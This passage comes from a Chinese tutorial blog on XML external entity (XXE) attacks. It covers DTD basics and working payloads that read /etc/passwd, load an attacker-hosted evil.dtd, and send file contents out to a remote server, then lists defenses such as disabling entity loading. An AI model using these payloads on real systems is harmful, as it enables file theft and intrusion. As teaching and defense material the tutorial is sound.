class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>外部声明(引用外部DTD)：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;。如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ol>
-   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- note.dtd内容 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
-<p>实体又分为一般实体和参数实体。</p>
-<ul>
-<li><p>一般实体的声明语法：<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code></p>
-<p>引用实体的方式：<code>&amp;实体名;</code>（一个和号 (&amp;)、一个实体名称、以及一个分号 (;)）</p>
-</li>
-<li><p>参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code></p>
-<p>引用实体的方式：<code>%实体名;</code></p>
-</li>
-</ul>
-<ol>
-<li><p>内部实体声明：&lt;!ENTITY 实体名称 “实体的值”&gt; 。例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>外部实体声明：&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;。例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-</li>
-</ol>
-<hr>
-<h1 id="XXE攻击方式"><a href="#XXE攻击方式" class="headerlink" title="XXE攻击方式"></a>XXE攻击方式</h1><p>当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数</p>
-<p>据，那么就会产生XML外部实体注入漏洞。</p>
-<p>引入外部实体方式有多种，比如：</p>
-<ol>
-<li><p><strong>直接通过DTD外部实体声明</strong></p>
-<p>XML内容：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>如果以上xml代码被解析，则会返回/etc/passwd文件的内容。</p>
-</li>
-</ol>
-<ol start="2">
-<li><p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
-<p>XML内容：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>DTD文件内容：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ol>
-<ol start="3">
-<li><p><strong>通过DTD外部实体声明引入外部实体声明</strong></p>
-<p>意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。如下XML内容：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [<span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>dtd文件内容：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ol>
-<p>   要注意的是，在上面的例子中，例1和例2实体名前面并没有<code>%</code>，而例3中的实体名前是有<code>%</code>的，这里的区别在于，例1中定义的实体是通用实体，而例2中定义的是参数实体，并且参数实体只能在DTD中使用，即例2代码中的第三行 <code>%d;</code>，这里就像在外面引用统用实体一样，这里的%d;就引用了<code>http:/mark4z5.com/evil.dtd</code>这个文件到DTD中。</p>
-<p>不同程序支持的协议不同，如下：</p>
-<table>
-<thead>
-<tr>
-<th align="left">LIBXML2</th>
-<th align="left">PHP</th>
-<th align="left">JAVA</th>
-<th align="left">.NET</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">file</td>
-<td align="left">file</td>
-<td align="left">http</td>
-<td align="left">file</td>
-</tr>
-<tr>
-<td align="left">http</td>
-<td align="left">http</td>
-<td align="left">https</td>
-<td align="left">http</td>
-</tr>
-<tr>
-<td align="left">ftp</td>
-<td align="left">ftp</td>
-<td align="left">ftp</td>
-<td align="left">https</td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">php</td>
-<td align="left">file</td>
-<td align="left">ftp</td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">compress.zlib</td>
-<td align="left">jar</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">compress.bzip2</td>
-<td align="left">netdoc</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">data</td>
-<td align="left">mailto</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">glob</td>
-<td align="left">gopher</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">phar</td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
-<hr>
-<h1 id="XXE实例"><a href="#XXE实例" class="headerlink" title="XXE实例"></a>XXE实例</h1><p>XXE可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<p><strong>实例一：读取任意文件</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/2.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/3.png"></p>
-<p>这里是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
-<p>另外，当数据不回显的时候，可以把数据发送到远程服务器，在触发XXE攻击之后，服务器会把文件内容发送到攻击者网站。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/4.png"></p>
-<p>远程DTD文件内容如下：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.122/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/5.png"></p>
-<p><strong>实例二：执行系统命令</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/6.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/7.png"></p>
-<p>这里是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
-<p><strong>实例三：探测内网端口</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/8.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/9.png"></p>
-<p>通过这里探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p>
-<p><strong>实例四：攻击内网网站</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/10.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/11.png"></p>
-<p>该例子是攻击内网struts2网站，远程执行了系统命令。</p>
-<hr>
-<h1 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h1><p>对于这种危害很大的漏洞，我们要进行防御。</p>
-<p>防御方法：</p>
-<ol>
-<li><p>使用开发语言提供的方法禁用外部实体</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ol>
-<ol start="2">
-<li><p>过滤和验证用户提交的XML数据</p>
-<p>一般过滤的关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
-</li>
-</ol>
-<ol start="3">
-<li>不允许XML中含有任何自己声明的DTD</li>
-</ol>
-]]></content>
-      <categories>
-        <category>XXE</category>
       </categories>
   </entry>
 </search>
